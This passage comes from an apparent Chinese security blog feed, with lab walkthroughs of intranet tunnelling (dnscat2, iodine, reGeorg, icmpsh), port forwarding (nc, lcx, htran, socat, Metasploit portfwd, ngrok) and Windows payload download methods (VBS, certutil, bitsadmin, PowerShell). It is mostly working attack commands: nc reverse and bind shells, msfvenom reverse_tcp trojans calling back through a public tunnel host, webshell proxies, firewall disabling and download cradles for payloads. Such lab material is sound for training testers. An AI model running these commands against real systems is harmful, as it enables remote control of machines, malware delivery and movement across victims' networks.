alt="image-20210205170757366"></p><p>流量走向</p><p>攻击机&lt;—&gt;客户机1:port&lt;—&gt;客户机1:port2&lt;—&gt;客户机2</p><h3 id="4-termite"><a href="#4-termite" class="headerlink" title="4.termite"></a>4.termite</h3><p>客户端监听端口：<code>agent_win32.exe -l port</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131012439648.png" alt="image-20210131012439648"></p><p>服务端连接到客户端即可：<code>./admin_linux_i586 -c 客户端ip -p 客户端port</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131012515965.png" alt="image-20210131012515965"></p><p>根据提示选择对应的功能即可，但是在使用socks时候要编辑代理链为本地</p><p>本次只测试了win7，没有测试win2k8</p><h2 id="2-dns协议"><a href="#2-dns协议" class="headerlink" title="2.dns协议"></a>2.dns协议</h2><h3 id="1-dnscat"><a href="#1-dnscat" class="headerlink" title="1.dnscat"></a>1.dnscat</h3><p>1.dnscat2</p><p>这里由于我新版的机器安装ruby很麻烦，所以把以前的贴图放出来（kali，win2k8）</p><p>分为客户端和服务端，但是客户端只支持Windows</p><p>服务端建立监听(服务端需要ruby环境)：<code>ruby dnscat2.rb --dns &quot;domain=pentestlab, host=lhost&quot; --no-cache</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172526702.png" alt="image-20210205172526702"></p><p>客户端连接到服务端：<code>dnscat2-v0.07-client-win32.exe --dns server=服务端ip</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172537723.png" alt="image-20210205172537723"></p><p>连接成功</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172610917.png" alt="image-20210205172610917"></p><p>可以执行的命令</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172622495.png" alt="image-20210205172622495"></p><p>查看会话信息：windows</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172632718.png" alt="image-20210205172632718"></p><p>与会话进行交互：session -i id</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172641743.png" alt="image-20210205172641743"></p><p>进行交互之后可以执行的命令</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172650493.png" alt="image-20210205172650493"></p><p><strong>如何得到windows的cmd？</strong></p><p>执行shell，创建一个新的会话信息</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172713447.png" alt="image-20210205172713447"></p><p>返回主界面查看cmd会话建立</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172722855.png" alt="image-20210205172722855"></p><p>进入cmd交互</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172730585.png" alt="image-20210205172730585"></p><h3 id="2-iodine（速度快，不支持win10）"><a href="#2-iodine（速度快，不支持win10）" class="headerlink" title="2.iodine（速度快，不支持win10）"></a>2.iodine（速度快，不支持win10）</h3><p>iodine基于C语言开发，分为服务端程序iodined和客户端程序 iodine，kali系统已内置。支持EDNS、base32，base64，base128等多种编码规范</p><p>攻击机执行：<code>iodined -p 1234 -f -DD 192.168.43.30 abc.com</code></p><p>客户机执行：<code>iodine -p 1234 -f -r -T TXT 192.168.43.30 abc.com</code></p><p>我没复现出来。。。</p><h2 id="3-http协议"><a href="#3-http协议" class="headerlink" title="3.http协议"></a>3.http协议</h2><p>这一个板块，由于我没有配环境，直接将之前的拿出来了。。。。</p><h3 id="1-reduh（对aspx好一丢丢）"><a href="#1-reduh（对aspx好一丢丢）" class="headerlink" title="1.reduh（对aspx好一丢丢）"></a>1.reduh（对aspx好一丢丢）</h3><p>支持aspx、jsp、php(php不稳定，以下为jsp环境测试)</p><p>把webshell上传至客户端，访问以后成功出现以下情况</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205175857271.png" alt="image-20210205175857271"></p><p>服务端连接，（服务端是Java环境）：<code>java -jar reDuhClient.jar webshell地址</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205175849425.png" alt="image-20210205175849425"></p><p>连接成功会监听本地的1010端口，使用nc连接即可：<code>nc -vv localhost 1010</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205175907641.png" alt="image-20210205175907641"></p><p>但是只能进行端口转功能，将目标转发至本地：<code>[createTunnel]lport:127.0.0.1:rport</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205175927785.png" alt="image-20210205175927785"></p><p>但是连接后不稳定会断开</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205175937357.png" alt="image-20210205175937357"></p><h3 id="2-tunna（对aspx好一点）"><a href="#2-tunna（对aspx好一点）" class="headerlink" title="2.tunna（对aspx好一点）"></a>2.tunna（对aspx好一点）</h3><p>支持aspx、jsp、php</p><p>将webshell传至客户机后访问成功出现以下情况</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180009697.png" alt="image-20210205180009697"></p><p>服务端执行：<code>pyhon proxy.py -u webshell地址 -l 4444 -r 3389 -s -v --no-socks</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180028394.png" alt="image-20210205180028394"></p><p>直接报错。。。</p><h3 id="3-regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）"><a href="#3-regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）" class="headerlink" title="3.regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）"></a>3.regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）</h3><p>支持jsp、aspx、php、ashx</p><p>将webshell上传至客户端成功后访问显示</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180039563.png" alt="image-20210205180039563"></p><p>服务端在本地指定端口上开启一个socks服务：<code>python reGeorgSocksProxy.py -p port -u webshell地址</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180047311.png" alt="image-20210205180047311"></p><p>设置本地的代理链为指定的端口</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180100801.png" alt="image-20210205180100801"></p><p>连接即可</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180110603.png" alt="image-20210205180110603"></p><p>但是http比较慢</p><h3 id="4-neo-regeorg"><a href="#4-neo-regeorg" class="headerlink" title="4.neo-regeorg"></a>4.neo-regeorg</h3><p>支持加密</p><p>服务端使用参数k指定密码，成功后会在相应文件夹下生成对应的webshell:<code>python neoreg.py generate -k 密码</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180155972.png" alt="image-20210205180155972"></p><p>使用同reGeorg类似</p><h2 id="4-icmp协议"><a href="#4-icmp协议" class="headerlink" title="4.icmp协议"></a>4.icmp协议</h2><h3 id="1-icmpsh"><a href="#1-icmpsh" class="headerlink" title="1.icmpsh"></a>1.icmpsh</h3><p>执行前在服务端执行：<code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></p><p>然后服务端继续执行：<code>python icmpsh_m.py lhost rhost</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205153640852.png" alt="image-20210205153640852"></p><p>执行完后不会有什么反应，在客户端使用参数t连接服务端：<code>icmpsh.exe -t rhost</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205153625385.png" alt="image-20210205153625385"></p><p>成功后服务端得到一个shell</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205153604374.png" alt="image-20210205153604374"></p><p>本次实验在win2008上进行的，因为win7连接失败了，连接后一直接收不到。</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cs</tag>
      
      <tag>msf</tag>
      
      <tag>ew</tag>
      
      <tag>termite</tag>
      
      <tag>dnscat</tag>
      
      <tag>iodine</tag>
      
      <tag>reduh</tag>
      
      <tag>tunna</tag>
      
      <tag>regeorg</tag>
      
      <tag>neo-regeorg</tag>
      
      <tag>icmpsh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>端口转发</title>
    <link href="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <url>/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<p>本文介绍一些端口转发的常用工具</p><a id="more"></a><p>攻击机：kali  192.168.43.30</p><p>客户机：win7 192.168.43.78</p><p>客户机1：win2k8 192.168.43.127</p><p>反向连接：此时外网无法访问内网，内网可以访问外网，就让内网机器主动连接外网攻击机</p><p>正向连接：此时内网无法访问外网，外网可以访问内网，此方式流量比较大，但是防火墙需关闭</p><h2 id="1-nc"><a href="#1-nc" class="headerlink" title="1.nc"></a>1.nc</h2><h3 id="1-反向连接"><a href="#1-反向连接" class="headerlink" title="1.反向连接"></a>1.反向连接</h3><p>攻击机监听本地端口：<code>nc -lnvp lport</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129213508026.png" alt="image-20210129213508026"></p><p>客户机反向连接攻击机：<code>nc.exe -e cmd rhost rport</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129215518607.png" alt="image-20210129215518607"></p><p>攻击机获得客户机的cmdshell</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129215531327.png" alt="image-20210129215531327"></p><h3 id="2-正向连接"><a href="#2-正向连接" class="headerlink" title="2.正向连接"></a>2.正向连接</h3><p>客户机开启监听：<code>nc.exe -l -p lport -e cmd.exe</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129215811482.png" alt="image-20210129215811482"></p><p>攻击机主动连接客户机：<code>nc -nvv rhost rport</code>即可获得客户机的cmdshell</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129215749829.png" alt="image-20210129215749829"></p><h2 id="2-lcx"><a href="#2-lcx" class="headerlink" title="2.lcx"></a>2.lcx</h2><h3 id="1-反向连接-1"><a href="#1-反向连接-1" class="headerlink" title="1.反向连接"></a>1.反向连接</h3><p>客户机把本地端口转发到远程端口：<code> lcx.exe -slave rhost rport lhost lport</code>（连接3389，需要开启此端口）</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129224151267.png" alt="image-20210129224151267"></p><p>攻击机用portmap（相当于Linux的lcx）将本地的端口转发至另外一个端口 ：<code>portmap -m 2 -p1 port -p2 port</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129221530534.png" alt="image-20210129221530534"></p><p>此时攻击机连接本地的5555端口（第一次连接时可能会确认）</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129224302638.png" alt="image-20210129224302638"></p><p>但是会把客户机挤掉线。。。</p><h3 id="2-正向连接-1"><a href="#2-正向连接-1" class="headerlink" title="2.正向连接"></a>2.正向连接</h3><p>可以访问外网的内网客户机将端口转发到另一台无法访问外网的内网客户机1的端口上：<code>lcx.exe -tran lport rhost rport</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129233221324.png" alt="image-20210129233221324"></p><p>攻击机连接访问外网的内网客户机的端口（此时就连接上了客户机1）</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129233406109.png" alt="image-20210129233406109"></p><h3 id="3-绕过防火墙"><a href="#3-绕过防火墙" class="headerlink" title="3.绕过防火墙"></a>3.绕过防火墙</h3><p>客户机将防火前监视的端口转发到防火墙监控不严的端口：<code>lcx.exe -tran 监控不严的窗口 lhost 监控严格的窗口</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129233956914.png" alt="image-20210129233956914"></p><p>此时攻击机连接客户机</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129234042891.png" alt="image-20210129234042891"></p><h2 id="3-netsh"><a href="#3-netsh" class="headerlink" title="3.netsh"></a>3.netsh</h2><p>Windows自带的防火墙规则配置工具。不同的操作系统版本中规则不一样。大概可以用来将本机端口转发至本机或者其他机器。</p><p><code>netsh firewall show state</code> 查看系统防火墙状态</p><p><code>netsh firewall set opmode disable</code> 关闭防火墙</p><p><code>netsh firewall set opmode enable</code> 开启防火墙</p><p>添加转发规则：<code>netsh interface portproxy add v4tov4 listenport=本地TCP端口 listenaddress=本地IP connectport=将传入连接重定向到本地或远程的端口 connectaddress=将传入连接重定向到本地或远程IP地址（或DNS名称）</code></p><p>查看转发规则：<code>netsh interface portproxy dump</code></p><p>显示系统中的转发规则列表：<code>netsh interface portproxy show all</code></p><p>删除转发规则：<code>netsh interface portproxy delete v4tov4 listenport=本机端口  listenaddress=本地ip</code></p><p>清除所有当前的端口转发规则：<code>netsh interface portproxy reset</code></p><h2 id="4-htran"><a href="#4-htran" class="headerlink" title="4.htran"></a>4.htran</h2><h3 id="1-绕过防火墙"><a href="#1-绕过防火墙" class="headerlink" title="1.绕过防火墙"></a>1.绕过防火墙</h3><h4 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1.正向连接"></a>1.正向连接</h4><p>客户机执行<code>htran.exe -p -tran 允许出网的端口(dns:53 http:80) 127.0.0.1 被禁出网的端口</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130005546295.png" alt="image-20210130005546295"></p><p>攻击机监听即可</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130005611826.png" alt="image-20210130005611826"></p><h4 id="2-反向连接"><a href="#2-反向连接" class="headerlink" title="2.反向连接"></a>2.反向连接</h4><p>客户机将本地的端口转发到攻击机端口<code>htran.exe -p -slave rhost rport 127.0.0.1 lport </code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130010234940.png" alt="image-20210130010234940"></p><p>攻击机利用portmap进行转发</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130010211109.png" alt="image-20210130010211109"></p><p>攻击机监听即可</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130010137130.png" alt="image-20210130010137130"></p><h3 id="2-转发内网端口"><a href="#2-转发内网端口" class="headerlink" title="2.转发内网端口"></a>2.转发内网端口</h3><p>1.将客户机转发到本地<code>Htran.exe -p -tran lport1 lhost lport2</code>    </p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130011414066.png" alt="image-20210130011414066"></p><p>攻击机监听客户机即可</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130011451711.png" alt="image-20210130011451711"></p><p>2.此方法内网中被攻击的主机均需具有此工具</p><p>客户机监听本地端口（相当于将端口1转发至端口2） <code>htran.exe -p listen lport1 lport2</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130011956041.png" alt="image-20210130011956041"></p><p>客户机1将本地的端口转发至客户机的端口1:<code> htran.exe -p -slave host1 port1 127.0.0.1 lport</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130012149883.png" alt="image-20210130012149883"></p><p>攻击机监听客户机的端口2即可（最后链接的是客户机1）<code>rdesktop 192.168.43.78：9999 </code></p><p>不知道什么原因，本地没有复现出来、。。。</p><h2 id="5-socat"><a href="#5-socat" class="headerlink" title="5.socat"></a>5.socat</h2><p>使用TCP4监听客户机本地端口，将客户机1的端口转发到本地：<code>socat.exe TCP4-LISTEN:lport,reuseaddr,fork TCP4:rhost:rport</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130014200104.png" alt="image-20210130014200104"></p><p>攻击机监听客户机即可（最后是监听的客户机1）</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130014306327.png" alt="image-20210130014306327"></p><h2 id="6-fpipe"><a href="#6-fpipe" class="headerlink" title="6.fpipe"></a>6.fpipe</h2><p>将客户机1转发到客户机:<code>Fpipe.exe -l lport -r rport rhost -v （v:显示过程）</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130014516518.png" alt="image-20210130014516518"></p><p>攻击机连接客户机即可（最后链接的是客户机2）</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130014555714.png" alt="image-20210130014555714"></p><h2 id="7-portfwd"><a href="#7-portfwd" class="headerlink" title="7.portfwd"></a>7.portfwd</h2><p> msf生成一个木马放入客户机进行执行:</p><pre><code class="hljs angelscript">msfvenom -p windows/meterpreter/reverse_tcp lhost=<span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.30</span> lport=<span class="hljs-number">3333</span> -f exe &gt; bug.exe</code></pre><p>攻击机开启监听.</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130015102500.png" alt="image-20210130015102500"></p><p>将客户机1转发到本地（此时本地是客户机：<code>portfwd add -l port -r rhost -p rport</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130015238123.png" alt="image-20210130015238123"></p><p>查看转发规则：<code>portfwd list</code></p><p>监听客户机即可（最后链接的是客户机1）</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130015600557.png" alt="image-20210130015600557"></p><h2 id="8-cs"><a href="#8-cs" class="headerlink" title="8.cs"></a>8.cs</h2><p>使用cs生成一个木马并放置客户机运行，成功上线，然后后msf一样在交互区输入：<code>port lport rhost rport</code></p><p>停止转发：<code>rprtfwd stop 8888</code></p><h2 id="9-rinetd（linux自带文件-etc-rinetd-conf）"><a href="#9-rinetd（linux自带文件-etc-rinetd-conf）" class="headerlink" title="9.rinetd（linux自带文件 /etc/rinetd.conf）"></a>9.rinetd（linux自带文件 /etc/rinetd.conf）</h2><p><a href="https://github.com/boutell/rinetd">https://github.com/boutell/rinetd</a></p><p>按如下格式编辑此文件，将远程客户机转发到本地攻击机：<code>0.0.0.0 lport rhost rport</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130020222684.png" alt="image-20210130020222684"></p><p>启动rinetd：<code>rinetd</code></p><p>监听本机即可（最后连接的是客户机）</p><p>我失败了，没转发出来，，，法克</p><h2 id="10-rtcp"><a href="#10-rtcp" class="headerlink" title="10.rtcp"></a>10.rtcp</h2><p>需要python环境。github项目地址：<a href="https://github.com/knownsec/rtcp">https://github.com/knownsec/rtcp</a></p><p>在客户机运行：<code>./rtcp.py c:localhost:port c:rhost:port1</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130210249919.png" alt="image-20210130210249919"></p><p>攻击机将端口1转发至端口2：<code>./rtcp.py l:port1 l:port2</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130210326260.png" alt="image-20210130210326260"></p><p>如果客户机是linux，可以转发时将22端口转发出来，然后ssh连接本地端口2：<code>ssh -p lhost port2</code></p><p>但是此次客户机是Windows，则转发3389，连接本地的端口2</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130210444890.png" alt="image-20210130210444890"></p><h2 id="11-ngrock"><a href="#11-ngrock" class="headerlink" title="11.ngrock"></a>11.ngrock</h2><p>官网：<a href="https://www.ngrok.cc/login.html">https://www.ngrok.cc/login.html</a></p><p>一款在线的内网穿透工具，本例以msf+ngrok</p><p>首先隧道管理-开通隧道-滑倒最后选择免费的服务器，然后简单设置一下</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130024649750.png" alt="image-20210130024649750"></p><p>注意：本地端口那里ip和端口选择kali的ip和端口</p><p>点击确定后成功开通</p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130024913633.png" alt="image-20210130024913633"></p><p>将客户端下载到kali，启动：<code>./sunny clientid 隧道id</code></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130025255206.png" alt="image-20210130025255206"></p><p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130025331893.png" alt="image-20210130025331893"></p><p>然后msf制作木马</p><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp  <span class="hljs-attribute">LHOST</span>=free.idcfengye.com <span class="hljs-attribute">LPORT</span>=远程端口 -f exe -o shell.exe</code></pre><p>然后开启监听</p><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/multi/</span>handler  set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp  set lhost <span class="hljs-number">192.168</span>.<span class="hljs-number">43.30</span>  <span class="hljs-regexp">//</span>这个就是你刚刚网站的填写的IPset lport <span class="hljs-number">3333</span>  <span class="hljs-regexp">//</span>这个就是刚刚IP后面跟着的端口exploit</code></pre>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lcx</tag>
      
      <tag>netsh</tag>
      
      <tag>htran</tag>
      
      <tag>socat</tag>
      
      <tag>fpipe</tag>
      
      <tag>portfwd</tag>
      
      <tag>cs</tag>
      
      <tag>rinetd</tag>
      
      <tag>rtcp</tag>
      
      <tag>ngrock</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>payload下载</title>
    <link href="/2020/10/05/ayload%E4%B8%8B%E8%BD%BD/"/>
    <url>/2020/10/05/ayload%E4%B8%8B%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<p>执行机器：win7  192.168.43.78</p><p>服务器：win2k8+phpstudy  192.168.43.127</p><h2 id="1-vbs"><a href="#1-vbs" class="headerlink" title="1.vbs"></a>1.vbs</h2><p>使用echo将以下内容写入downfile.vbs,写入成功后会在相应的文件夹生成一个downfile.vbs文件</p><pre><code class="hljs shell">C:\Users\haha\Desktop\test&gt;echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  &gt;&gt; downfile.vbs</code></pre><p>可使用type查看文件内容<code>type downfile.vbs</code></p><p>使用cscript 结合vbs文件下载payload[exe]：<code>cscript downfile.vbs payload路径 payload落地地址</code></p><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>aha<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\t</span>est&gt;cscript downfile.vbs http://192.168.43.127/payload.txt C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>aha<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\t</span>est<span class="hljs-symbol">\1</span>.txt</code></pre><p>优点:支持windows全版本系列   缺点:对https不友好</p><h2 id="2-certutil"><a href="#2-certutil" class="headerlink" title="2.certutil"></a>2.certutil</h2><p>使用<code>certutil -urlcache -split -f payload地址</code> 来下载文件 </p><pre><code class="hljs shell">C:\Users\haha\Desktop\test&gt;certutil -urlcache -split -f http://192.168.43.127/payload.txt****  联机  ****  0000  ...  000fCertUtil: -URLCache 命令成功完成。</code></pre><p>在使用后会出现缓存，使用<code>certutil -urlcache -split -f payload地址 delete </code>来删除即可</p><pre><code class="hljs shell">C:\Users\haha\Desktop\test&gt;certutil -urlcache -split -f http://192.168.43.127/payload.txt deletehttp://192.168.43.127/payload.txt删除的 WinHttp 缓存项目: 1CertUtil: -URLCache 命令成功完成。</code></pre><h2 id="3-bitsadmin"><a href="#3-bitsadmin" class="headerlink" title="3.bitsadmin"></a>3.bitsadmin</h2><p>使用<code>bitsadmin /rawreturn /transfer down payload地址 保存payload路径/文件名</code>下载payload[exe]</p><pre><code class="hljs shell">C:\Users\haha\Desktop\test&gt;bitsadmin /rawreturn /transfer down http://192.168.43.127/payload.txt C:\Users\haha\Desktop\test\xx.txt</code></pre><h2 id="4-js"><a href="#4-js" class="headerlink" title="4.js"></a>4.js</h2><p>新建一个js文件将以下内容保存</p><pre><code class="hljs reasonml">var WinHttpReq = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span>;WinHttpReq.<span class="hljs-constructor">Open(<span class="hljs-string">&quot;GET&quot;</span>, WScript.Arguments(0)</span>, <span class="hljs-comment">/*async=*/</span><span class="hljs-literal">false</span>);WinHttpReq.<span class="hljs-constructor">Send()</span>;BinStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ActiveXObject(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)</span>;BinStream.Type = <span class="hljs-number">1</span>;BinStream.<span class="hljs-constructor">Open()</span>;BinStream.<span class="hljs-constructor">Write(WinHttpReq.ResponseBody)</span>;BinStream.<span class="hljs-constructor">SaveToFile(<span class="hljs-string">&quot;payload目标机器保存文件名&quot;</span>)</span>;</code></pre><p>使用<code>cscript /nologo 上述js文件名 payload地址</code> 下载payload[exe]</p><pre><code class="hljs latex">C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">haha</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">test</span></span>&gt;cscript /nologo 1.js http://192.168.43.127/payload.txt</code></pre><p>下载完成后所下载的文件会保存在js文件同一目录下</p><h2 id="5-wget"><a href="#5-wget" class="headerlink" title="5.wget"></a>5.wget</h2><p>需要将wget.exe上传到目标机器，在相应目录下执行<code>wget -O &quot;payload落地文件名&quot; payload地址</code>即可下载payload[exe]</p><p>wget地址：<a href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></p><h2 id="6-curl"><a href="#6-curl" class="headerlink" title="6.curl"></a>6.curl</h2><p>直接在相应目录的cmd下执行<code>curl payload地址 -o 落地文件名</code>下载payload[exe]</p><pre><code class="hljs angelscript">C:\Users\haha\Desktop\新建文件夹&gt;curl http:<span class="hljs-comment">//192.168.43.127/11.exe -o 1x.exe</span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed<span class="hljs-number">100</span>  <span class="hljs-number">366</span>k  <span class="hljs-number">100</span>  <span class="hljs-number">366</span>k    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   <span class="hljs-number">366</span>k      <span class="hljs-number">0</span>  <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> --:--:--  <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> <span class="hljs-number">11.5</span>M</code></pre><h2 id="7-powershell"><a href="#7-powershell" class="headerlink" title="7.powershell"></a>7.powershell</h2><h3 id="1-下载payload-exe-到本地"><a href="#1-下载payload-exe-到本地" class="headerlink" title="1.下载payload[exe]到本地"></a>1.下载payload[exe]到本地</h3><p><code>powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;payload地址&#39;,&#39;payload落地地址&#39;)</code>或者是</p><p><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;payload地址&#39;,&#39;payload落地地址&#39;)</code></p><pre><code class="hljs stylus">C:\Users\haha\Desktop\test&gt;powershell -exec bypass -c (new-<span class="hljs-selector-tag">object</span> System<span class="hljs-selector-class">.Net</span>.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.43.127/payload.txt&#x27;</span>,<span class="hljs-string">&#x27;C:\Users\haha\Desktop\</span><span class="hljs-string">test\2.txt&#x27;</span>)或者C:\Users\haha\Desktop\test&gt;powershell (new-<span class="hljs-selector-tag">object</span> System<span class="hljs-selector-class">.Net</span>.WebClient).Download<span class="hljs-function"><span class="hljs-title">File</span><span 